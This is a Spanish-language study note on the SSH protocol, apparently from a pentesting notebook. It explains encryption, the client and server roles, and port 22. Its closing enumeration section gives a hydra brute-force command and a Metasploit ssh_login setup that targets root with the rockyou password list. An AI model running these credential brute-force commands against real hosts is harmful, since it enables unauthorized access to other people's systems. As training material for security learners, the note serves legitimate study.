----
El Protocolo SSH (Secure Shell) es un protocolo de red que proporciona una forma segura de acceder a un sistema remoto y ejecutar comandos de forma segura a través de una conexión cifrada. SSH es ampliamente utilizado en entornos de redes informáticas para administrar sistemas remotos de forma segura y para transferir archivos de manera segura.

El protocolo SSH cifra todos los datos transmitidos entre el cliente y el servidor, lo que garantiza la privacidad y la seguridad de la comunicación. Utiliza técnicas de cifrado asimétrico y simétrico para lograr este nivel de seguridad. Por lo general es usado mediante el [[puerto]] 22.

SSH se compone de dos partes principales:

1. ***SSH Cliente***: Este es el software que se ejecuta en la máquina local desde donde se inicia la conexión SSH. Los usuarios utilizan el cliente SSH para conectarse a servidores remotos y ejecutar comandos de manera segura.
2. ***SSH Servidor***: Este es el software que se ejecuta en el sistema remoto al que se desea acceder de forma segura. El servidor SSH acepta conexiones entrantes desde clientes SSH y proporciona acceso seguro al sistema remoto.

Procedimiento de enumeración:

- Para conectarse: ```ssh usuario1@192.168.0.1 -p 22```
- Fuerza bruta: ```hydra -l user1 -P pass.txt ssh://192.168.0.1 -s 22```
- [[Metasploit]]: De la siguiente forma

```
use scanner/ssh/ssh_login

(siempre probar con la credencial por default de ssh si es que no se tienen credenciales válidas)

set USERNAME root

set PASS_FILE rockyou.txt

set RHOST IPVictima

set RPORT 22

run
```
